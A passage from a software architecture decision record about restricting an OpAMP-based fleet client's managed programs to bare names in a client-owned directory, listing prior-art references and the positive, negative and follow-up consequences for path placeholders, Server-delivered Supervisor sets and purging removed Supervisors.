- **Elastic Agent and the OpenTelemetry Collector's own supervisor** both manage only binaries they
  install; neither offers a supervise-but-never-update mode for a distribution-packaged program.
- **Elastic Agent** — versioned home directory plus a symlink to the active executable, the shape
  ADR-0010 already follows for the Client itself; consulted for whether Managed Processes should get
  the same (decided against, for now).
  <https://deepwiki.com/elastic/elastic-agent/6-version-management-and-upgrades>
- **Bindplane** — distinguishes collectors it manages from detached ones, i.e. the same
  ownership boundary this decision draws, expressed as an install mode rather than as a path shape.
  Its collector uninstall removes the collector's install directory and state as one act; the
  managed-fleet precedent that removal means the files go.
  <https://docs.bindplane.com/deployment/virtual-machine/collector/install-and-uninstall-bindplane-collectors>
- **systemd unit specifiers** — `%S` (state directory), `%t` (runtime directory) and friends expand
  in a unit's arguments, and the manual states the executable path itself may not contain them: the
  same split the placeholders draw, for a related reason.
  <https://www.freedesktop.org/software/systemd/man/latest/systemd.exec.html>
- **systemd `StateDirectory=`** creates the directory and exports `$STATE_DIRECTORY` — the
  environment-variable alternative, rejected above because `argv` is not expanded.
- [OpAMP specification `v0.19.0`](https://github.com/open-telemetry/opamp-spec/blob/v0.19.0/specification.md)
  — `EffectiveConfig` is explicitly allowed to differ from the offered remote configuration by
  merging local configuration; `RemoteConfigStatuses` (`APPLYING`/`APPLIED`/`FAILED`) is the
  lifecycle point 14 adopts.
- [`toml_edit`](https://docs.rs/toml_edit) (checked 2026-08-12) — format- and comment-preserving
  TOML editing; what `cargo add`/`cargo-edit` mutate manifests with.
- **OpAMP specification `v0.20.0`** — `agent_disconnect` as the Agent's final word; an identity
  that has said it should not silently return (the reasoning behind deleting `instance-uid`).
  <https://github.com/open-telemetry/opamp-spec/blob/v0.20.0/specification.md>
- **Debian/apt: `remove` vs `purge`** — the established distinction between stopping/removing a
  thing and purging its configuration and state; the purge semantics of a Server-driven removal
  follow it precisely because no operator is present to run the second step.
  <https://www.debian.org/doc/manuals/debian-faq/uptodate.en.html>
- **The OpAMP Baseline's `AcceptsPackages`** is a per-Agent capability, not a per-fleet one; making
  it constant here is a narrowing of this implementation, not of the protocol, and a future decision
  could widen it again without a wire change.
- **The path-as-consent framing** is what makes removing the absolute-path row a single-row change
  rather than a redesign: there is no separate capability flag to retire, because the decision
  deliberately refused to add one (the retired `accepts_packages` key is still refused loudly by the
  loader, point 4).
- **ADR-0032's constraints** are the honest measure of what replaces the absolute-path route: glibc
  cannot be bundled, so a relocatable tree is per distribution family, and ADR-0015 forbids symlinks
  and hard links in a package tree. Repacking is a real path, not a free one.
- The general principle behind the path rule — make the illegal state unrepresentable rather than
  validate it — is what removes a whole class of configuration error instead of reporting it.
- The consent-by-ownership model the delivery rule builds on is the bare-name rule above together
  with ADR-0015/0018 (signed, hash-verified delivery).
- In-repo: ADR-0011 (the `[[supervisor]]` blocks), ADR-0012 and ADR-0028 (the Server-side
  delivery path the Supervisor set completes), ADR-0018 (the self-Agent), ADR-0014 (the pattern of
  a verified, persisted Server offer changing what the Client runs).
- In-repo: ADR-0015 (retention for the living, contrasted deliberately with the purge of a removed
  Supervisor).

## Consequences

### The Supervisor's directory and its program

- Positive: **the trap is gone.** A Client that accepts packages writes only inside a directory it
  owns; updating a Managed Process needs no root and no permissions on a system `bin`.
- Positive: a **raw** artifact is installed by moving it rather than copying it — staging and target
  sit in one tree on one filesystem, so the install costs a metadata update instead of a second full
  write of several hundred megabytes. This does **not** extend to an archive, which has to be
  unpacked; since upstream Collector releases ship as `.tar.gz`, the most common case keeps writing
  the program twice, and the saving lands on artifacts published as bare binaries.
- Positive: `.rollback` and `.staged` stop appearing next to system binaries.
- Positive: hardening becomes expressible — systemd `ReadWritePaths=`/`StateDirectory=` over exactly
  one tree instead of write access to `/usr/local/bin`.
- Positive: `supervisor_dir` gets programs off a `noexec` or undersized `/var`, which ADR-0010's
  layout does not allow for Managed Processes.
- Positive: **no security property is traded away.** ADR-0017's containment holds unchanged, because
  this decision moves where a member is written and not how it is chosen.
- Positive: **one kind of Managed Process.** Every feature that touches packages — targeting,
  versions, rollback, the health gate, the version probe — has one case to reason about. The
  `owned` flag and the branches reading it leave the code, and with them the class of bug where a
  capability depends on how a path was spelled.
- Positive: **the fleet's picture of a host does not depend on which file a block came from.** With
  the delivery restriction of point 16 matching what the loader accepts, a locally
  written block and a Server-delivered one describe the same kind of thing.
- Positive: **a silent revocation is impossible.** An operator who writes an absolute path gets a
  refusal at startup instead of an Agent that comes up managed-looking and quietly takes no
  packages.
- Negative / trade-offs: **this breaks every `client.toml` with `accepts_packages`.** The key is
  refused at startup, and the program has to move into the Supervisor's `program/` directory with
  its path reduced to a bare name. One edit per host, and it belongs in the release note.
- Negative / trade-offs: a bare name does not search `$PATH`. Anyone relying on that gets a
  different path with no error — the startup log line (point 5) is the only thing that
  surfaces it.
- Negative / trade-offs: a Foreign Agent that is more than one file **still cannot be packaged**
  through this layout alone. The Client's ownership of the program directory is explicit, which
  makes the gap look more surprising than it did before.
- Negative / trade-offs: changing `supervisor_dir` on a running host leaves the old tree behind —
  `instance-uid` included, so each Supervisor re-registers as a **new** Agent on the Server, losing
  its history there. Nothing migrates automatically; that is an operator action.
- Negative / trade-offs: one program per Supervisor instead of one shared copy. Three Supervisors
  running the same Collector distribution cost three copies of it.
- Negative: **the supervise-but-do-not-update use case is gone**, and it was a first-class,
  documented route. An operator who wants the host's package manager to keep owning an agent's
  updates while the fleet watches and configures it has no way to say so. This is the deliberate
  content of the decision, not a side effect: that operator must either repack the agent or not
  manage it here.
- Negative: **Icinga 2 on Windows loses a fallback that was designed in.** ADR-0032 kept the
  absolute form in scope from the start because "Windows is unproven — if the MSI payload cannot be
  relocated, the same kind supervises a machine-installed Icinga 2 there." That safety net is
  removed before the thing it protected against was resolved. If the Windows repack proves
  impossible, the Icinga 2 kind is Linux-only until some other decision addresses it — and this
  decision should be revisited rather than worked around.
- Negative: **two manual walkthroughs must be rewritten, not deleted.** `glpi-agent.md`'s Linux and
  Windows machine-installed examples and `icinga2.md`'s fallback describe working setups; their
  replacements are the fleet-delivered routes, which exist but are less familiar. A page that simply
  loses its example leaves an operator with no path at all.
- Negative: **adoption gets harder.** Taking over a host that already runs a vendor agent used to be
  a one-line block naming the existing binary; it is now a repack plus a package rollout before the
  Agent appears in the fleet at all.
- Follow-ups: **multi-file packages for Foreign Agents** — unpacking an archive whole into
  `program/`, relaxing the bare-name form to any relative path without `..`, and swapping the tree
  by directory rename. That decision has to carry its own containment (member paths normalized and
  refused rather than skipped, symlink and hard-link members refused, a total unpacked size and
  member count beside the per-member limit) and should weigh making the tree an explicit opt-in
  on the block rather than the default, so only the hosts that need it carry the risk. It should
  also settle how a version disappears from a configured path, since upstream releases lay their
  program under a versioned directory.
- Follow-ups: whether `working_dir` and `args` should resolve relative paths the same way — an
  absolute path into the config directory can be moved underneath by `supervisor_dir`, which the
  placeholders of point 6 answer for `args`, `working_dir`, and `env`; whether Managed
  Processes eventually need ADR-0010's versioned side-by-side layout; whether a stale `.rollback`
  should be pruned on a schedule rather than only on the next apply; and a decision on migrating an
  existing Supervisor tree when its root moves.
- Follow-ups: whether a supervise-only mode should exist as its own decision — with its own
  capability model rather than as a path-parser fallthrough — is left open and would need one. So
  is what happens to the Icinga 2 kind if the Windows repack cannot be made to work. Neither is
  decided here.

### Paths in arguments

- Positive: the silent failure disappears. A Foreign Agent's configuration path is derived from the
  same value the Client derives it from, so relocating `supervisor_dir` — or renaming a Supervisor —
  cannot leave the process reading a file nobody writes.
- Positive: the example configuration stops shipping a hard-coded absolute path that is wrong for
  every host that does not use the defaults.
- Negative / trade-offs: a typo in a placeholder name (`${config-dir}`) is passed through to the
  process rather than refused, which is the opposite of how ADR-0008 treats an unknown *key*. That
  is deliberate — the alternative breaks agents whose own syntax overlaps — but it is an
  inconsistency in the configuration's behaviour, and the documentation has to say so where the
  placeholders are listed.
- Negative / trade-offs: two ways to spell the same path exist, since an absolute path in an
  argument still works. The example leads with the placeholder; nothing forces it.
- Negative / trade-offs: this is a second mechanism for "a path inside the Supervisor's directory",
  beside the program-path rule. They are deliberately not unified (see the alternatives), but a
  reader meets both and has to learn which applies where.
- Follow-ups: whether the same placeholders should be available in the Collector plugin's extra
  `args`, which has no need for them yet; and whether a Foreign Agent that reads its environment
  should additionally be handed these paths as variables.

### The Supervisor set from the Server

- Positive: Supervisors become fleet-manageable end to end — an operator publishes a typed
  Configuration and the matching Clients converge on the named Supervisor set, with the same
  draft/publish gate and Selector scoping every other Configuration has (ADR-0012, ADR-0028).
  The self-Agent's `AcceptsRemoteConfig` stops being a lie.
- Positive: unchanged Supervisors ride through an apply untouched; a fleet-wide change to one
  collector type does not restart the others.
- Negative / trade-offs: the Engine must add and remove Agents at runtime — new machinery where
  the set was startup-fixed. A removed Supervisor's Agent must disconnect cleanly, an added one
  must introduce itself mid-connection, and the event channel's index-keyed routing must survive
  the mutation. This is the substantial implementation cost of the decision.
- Negative / trade-offs: a new dependency (`toml_edit`) in the Client.
- Negative / trade-offs: after the first applied offer, a *local* edit to the `[[supervisor]]`
  blocks drifts silently: the Client reports the offer's hash as applied, so the Server —
  whose composed map is unchanged — never re-offers, and the local edit stands until the next
  publication overwrites it. Reconciling file-vs-offer at startup is a follow-up, not part of
  this decision.
- Follow-ups: startup reconciliation of a locally edited Supervisor set against the last stored
  offer; a bundled-UI affordance for authoring Supervisor-set Configurations (the boundary of
  point 10 suggests a dedicated editor rather than a free-text body); the reserved
  `SIGHUP` configuration reload ([`runtime.rs`](../../crates/client/src/service/runtime.rs#L329-L338))
  could reuse point 12's diff-apply for local edits.
- Positive: the package-signing trust model holds even against a Server compromised below the
  signing key — a pushed Supervisor set can only ever run Client-owned programs, which are
  themselves delivered as signature/hash-verified packages. The delivery path's code-execution
  surface collapses to exactly what the bare-name rule already consents to.
- Follow-ups: a regression test that a pushed set with an absolute-path program is refused `FAILED`
  and touches neither the running set nor the file; the shipped example `client.toml` prose and the
  rollout/client manuals note that Server-delivered Supervisor blocks must name a bare program.

### A removed Supervisor's directory

- Positive: a removal is complete — no program-sized leftovers, no stale identity, no stale
  configuration. Re-adding a Supervisor under the same name is a genuinely fresh Agent, installed
  by the same package path as any new one.
- Positive: the leftover-tree problem shrinks to the cases an operator causes by hand (moved root,
  offline edit), and those become visible in the log instead of silent.
- Negative / trade-offs: **removal is destructive and final.** A Supervisor removed by a
  mis-scoped Selector loses its identity, its Server-side history continuity, and its locally
  installed program; re-adding restores service, not history. This is accepted as the honest
  meaning of "removed" — the alternative (stale resurrection) is worse, and rollout scoping is
  the Server-side gate for it.
- Negative / trade-offs: a crash between the `client.toml` write and the purge, or a purge error,
  leaves an orphan directory that startup only reports — a human closes that loop.
- Negative / trade-offs: the e2e removal contract widens — the test pins goodbye and file; it must
  additionally pin "directory gone" (and "directory kept" for a changed block).
- Follow-ups: whether the startup report of orphaned directories should grow an explicit,
  opt-in reap; whether `service uninstall` (which deliberately keeps all state) should
  offer a purge of the whole `supervisors_root()` by the same rule.
